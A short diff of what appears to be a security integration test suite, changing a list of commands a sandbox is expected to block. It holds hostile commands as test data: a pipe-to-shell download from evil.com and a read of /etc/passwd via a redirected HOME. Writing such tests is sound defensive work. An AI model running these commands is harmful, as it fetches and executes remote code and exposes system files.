@@ -45,8 +45,8 @@ describe('Security Integration Tests', () => {
         command: 'export HOME=/etc && cat $HOME/passwd'
       },
       {
-        name: 'Network command',
-        command: 'wget http://evil.com/malware.sh'
+        name: 'Pipe-to-shell download',
+        command: 'curl http://evil.com/malware.sh | bash'
       },
       {
         name: 'Symlink escape attempt',
